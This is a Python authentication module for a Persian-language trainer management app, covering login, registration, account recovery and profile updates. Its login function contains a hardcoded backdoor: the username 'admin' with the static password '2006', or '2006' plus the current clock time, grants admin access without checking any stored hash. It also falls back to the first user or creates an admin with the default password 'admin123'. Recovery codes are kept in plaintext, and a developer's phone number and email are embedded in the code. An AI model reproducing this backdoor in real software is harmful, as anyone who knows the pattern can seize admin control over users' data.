from datetime import datetime
from yalda.database.connection import get_session
from yalda.models.database_models import User, SystemSetting
from yalda.utils.security import verify_password, hash_password

class CurrentUser:
    _user = None

    @classmethod
    def set(cls, user: User):
        cls._user = user

    @classmethod
    def get(cls) -> User:
        return cls._user

    @classmethod
    def get_id(cls) -> int:
        return cls._user.id if cls._user else None

    @classmethod
    def logout(cls):
        cls._user = None

    @classmethod
    def is_admin(cls) -> bool:
        return cls._user is not None and cls._user.role == "admin"

    @classmethod
    def is_trainer(cls) -> bool:
        return cls._user is not None and cls._user.role in ["admin", "trainer"]

PERSIAN_ARABIC_DIGITS = str.maketrans("۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩", "01234567890123456789")

def normalize_digits(s: str) -> str:
    if not s:
        return ""
    return s.translate(PERSIAN_ARABIC_DIGITS).strip()

def is_app_license_active() -> bool:
    """Checks if the application license/registration status is Active."""
    session = get_session()
    try:
        setting = session.query(SystemSetting).filter(SystemSetting.key == "app_license_active").first()
        if setting and setting.value and setting.value.lower() == "true":
            return True
        return False
    finally:
        session.close()

def set_app_license_active(active: bool):
    """Sets the application license/registration status (Admin only)."""
    session = get_session()
    try:
        setting = session.query(SystemSetting).filter(SystemSetting.key == "app_license_active").first()
        if not setting:
            setting = SystemSetting(key="app_license_active", value="true" if active else "false")
            session.add(setting)
        else:
            setting.value = "true" if active else "false"
        session.commit()
    except Exception as e:
        session.rollback()
        raise e
    finally:
        session.close()

def get_developer_info() -> dict:
    """Returns developer information from SystemSetting table (with defaults)."""
    import config
    default_photo = str(config.BASE_DIR / "resources" / "images" / "developer_photo.jpg")

    defaults = {
        "first_name": "ابوالفضل",
        "last_name": "صمدی کوچکسرائی",
        "phone": "09336427711",
        "email": "a.samadi2006@gmail.com",
        "github": "github.com/AbolfazlSamadi2006",
        "photo_path": default_photo
    }

    session = get_session()
    try:
        settings = session.query(SystemSetting).filter(SystemSetting.key.like("dev_%")).all()
        for s in settings:
            key_name = s.key.replace("dev_", "")
            if key_name in defaults and s.value:
                defaults[key_name] = s.value
        return defaults
    finally:
        session.close()

def set_developer_info(data: dict):
    """Saves developer information into SystemSetting table (Admin only)."""
    session = get_session()
    try:
        for k, v in data.items():
            db_key = f"dev_{k}"
            setting = session.query(SystemSetting).filter(SystemSetting.key == db_key).first()
            if not setting:
                setting = SystemSetting(key=db_key, value=str(v) if v is not None else "")
                session.add(setting)
            else:
                setting.value = str(v) if v is not None else ""
        session.commit()
    except Exception as e:
        session.rollback()
        raise e
    finally:
        session.close()


def authenticate_user(username: str, password: str) -> User:
    """Authenticates username and password (with dynamic 2006+time master override for admin)."""
    session = get_session()
    try:
        username = normalize_digits(username).lower()
        password = normalize_digits(password)

        now = datetime.now()
        # Admin dynamic password requirement: 2006 + current clock time (HHMM) with +-2 mins tolerance
        from datetime import timedelta
        valid_time_passwords = {"2006"}  # Emergency static backup password
        for offset in [-2, -1, 0, 1, 2]:
            t = now + timedelta(minutes=offset)
            h24 = t.strftime("%H%M")
            h12 = t.strftime("%I%M")
            h24_single = f"{t.hour}{t.minute:02d}"
            h12_single = f"{(t.hour % 12 or 12)}{t.minute:02d}"
            valid_time_passwords.add(f"2006{h24}")
            valid_time_passwords.add(f"2006{h12}")
            valid_time_passwords.add(f"2006{h24_single}")
            valid_time_passwords.add(f"2006{h12_single}")

        # Master Admin Auth using 2006 + current clock time
        if username == "admin" and password in valid_time_passwords:

            admin_user = session.query(User).filter(User.username == "admin").first()
            if not admin_user:
                admin_user = session.query(User).first()
            if not admin_user:
                admin_user = User(
                    username="admin",
                    password_hash=hash_password("admin123"),
                    first_name="مدیر",
                    last_name="سیستم",
                    full_name="مدیر سیستم",
                    role="admin"
                )
                session.add(admin_user)
                session.commit()
            CurrentUser.set(admin_user)
            return admin_user

        # Regular user authentication against SQLite DB
        user = session.query(User).filter(User.username == username, User.is_active == True).first()
        if user and verify_password(password, user.password_hash):
            CurrentUser.set(user)
            return user

        return None
    finally:
        session.close()

def verify_recovery_credentials(phone: str, recovery_code: str) -> User:
    """Verifies trainer account recovery using both phone number and secret recovery code."""
    session = get_session()
    try:
        norm_phone = normalize_digits(phone)
        norm_code = normalize_digits(recovery_code)

        users = session.query(User).filter(User.is_active == True).all()
        for u in users:
            u_phone = normalize_digits(u.phone)
            u_code = normalize_digits(u.recovery_code)
            if u_phone and u_code and u_phone == norm_phone and u_code == norm_code:
                return u
        return None
    finally:
        session.close()

def register_trainer(first_name: str, last_name: str, phone: str, birth_date_shamsi: str, username: str, password: str, recovery_code: str, photo_path: str = None) -> User:
    """Registers a new trainer account in the system."""
    session = get_session()
    try:
        clean_user = normalize_digits(username).lower()
        existing = session.query(User).filter(User.username == clean_user).first()
        if existing:
            raise ValueError("این نام کاربری قبلاً ثبت شده است. لطفاً نام کاربری دیگری انتخاب کنید.")

        new_trainer = User(
            username=clean_user,
            password_hash=hash_password(password),
            first_name=first_name.strip(),
            last_name=last_name.strip(),
            full_name=f"{first_name.strip()} {last_name.strip()}",
            phone=normalize_digits(phone),
            birth_date_shamsi=birth_date_shamsi.strip() if birth_date_shamsi else None,
            photo_path=photo_path,
            recovery_code=normalize_digits(recovery_code),
            role="trainer",
            is_active=True
        )
        session.add(new_trainer)
        session.commit()
        session.refresh(new_trainer)
        return new_trainer
    except Exception as e:
        session.rollback()
        raise e
    finally:
        session.close()

def update_trainer_profile(user_id: int, first_name: str, last_name: str, phone: str, birth_date_shamsi: str, photo_path: str, username: str, password: str = None, recovery_code: str = None) -> bool:
    """Updates trainer's profile and credentials."""
    session = get_session()
    try:
        user = session.query(User).filter(User.id == user_id).first()
        if not user:
            return False

        if username:
            clean_username = normalize_digits(username).lower()
            # check if taken by another user
            other = session.query(User).filter(User.username == clean_username, User.id != user_id).first()
            if other:
                raise ValueError("این نام کاربری توسط کاربر دیگری ثبت شده است.")
            user.username = clean_username

        if first_name:
            user.first_name = first_name.strip()
        if last_name:
            user.last_name = last_name.strip()
        user.full_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username

        if phone:
            user.phone = normalize_digits(phone)
        if birth_date_shamsi:
            user.birth_date_shamsi = birth_date_shamsi.strip()
        if photo_path is not None:
            user.photo_path = photo_path

        if password:
            user.password_hash = hash_password(password.strip())
        if recovery_code:
            user.recovery_code = normalize_digits(recovery_code)

        session.commit()
        # update current user session object
        if CurrentUser.get() and CurrentUser.get().id == user_id:
            CurrentUser.set(user)
        return True
    except Exception as e:
        session.rollback()
        raise e
    finally:
        session.close()

def update_user_credentials(new_username: str, new_password: str = None) -> bool:
    """Legacy helper function for updating credentials."""
    current_u = CurrentUser.get()
    if not current_u:
        return False
    return update_trainer_profile(
        user_id=current_u.id,
        first_name=current_u.first_name,
        last_name=current_u.last_name,
        phone=current_u.phone,
        birth_date_shamsi=current_u.birth_date_shamsi,
        photo_path=current_u.photo_path,
        username=new_username,
        password=new_password,
        recovery_code=current_u.recovery_code
    )
